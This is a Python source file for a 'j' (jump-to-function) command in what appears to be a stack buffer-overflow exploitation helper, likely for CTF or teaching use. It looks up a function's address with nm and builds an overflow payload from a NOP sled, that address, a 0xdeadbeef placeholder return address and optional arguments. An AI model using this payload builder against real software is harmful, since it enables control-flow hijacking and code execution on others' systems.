#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from Command import Command
from utils import format_hex_value
import subprocess


class JumpToFunctionCommand(Command):
    command = "j"
    usage = "[function name | function address] [some arguments](optional)"
    help = "\tJump to a function.\n\tex:\tj VulnerableFunction"

    def set_option(self, option, cmd):

        if cmd[1].startswith("0x"):
            addr = cmd[1]

        else:
            addr = ""
            result = subprocess.run(['nm', option.binPath], stdout=subprocess.PIPE)
            results = result.stdout.decode('utf-8').split('\n')

            for line in results:
                res = line.split(' ')
                if len(res) == 3:
                    if res[2] == cmd[1]:
                        addr = res[0]

        payload = format_hex_value(addr, option)
        if payload == "":
            return

        if len(cmd) > 2:
            payload += format_hex_value("0xdeadbeef", option)
            cmd = cmd[2:]
            for arg in cmd:
                payload += format_hex_value(arg, option)

        if option.buffSize:
            option.payload = '"\\x90" * ' + str(option.buffSize) + ' + "' + payload + '"'
        else:
            option.payload = '"' + payload + '" * 500'
